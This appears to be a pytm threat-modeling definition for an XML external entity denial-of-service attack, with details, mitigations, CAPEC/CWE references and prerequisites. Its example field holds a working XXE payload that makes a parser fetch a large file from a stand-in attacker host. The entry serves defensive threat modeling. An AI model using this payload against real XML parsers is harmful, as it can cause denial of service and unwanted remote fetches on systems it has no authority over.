sid: INP19
title: XML External Entities Blowup
source: pytm v1.4.0
pytm_targets:
- Server
elements:
- process
condition: target.usesXMLParser is False or target.controls.disablesDTD is False
severity: Medium
likelihood: null
details: This attack takes advantage of the entity replacement property of XML where the value
  of the replacement is a URI. A well-crafted XML document could have the entity refer to
  a URI that consumes a large amount of resources to create a denial of service condition.
  This can cause the system to either freeze, crash, or execute arbitrary code depending on
  the URI.
mitigations: This attack may be mitigated by tweaking the XML parser to not resolve external
  entities. If external entities are needed, then implement a custom XmlResolver that has
  a request timeout, data retrieval limit, and restrict resources it can retrieve locally.
example: In this example, the XML parser parses the attacker's XML and opens the malicious
  URI where the attacker controls the server and writes a massive amount of data to the response
  stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?><
  !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>
references: https://capec.mitre.org/data/definitions/221.html, http://cwe.mitre.org/data/definitions/611.html
prerequisites: A server that has an implementation that accepts entities containing URI values.
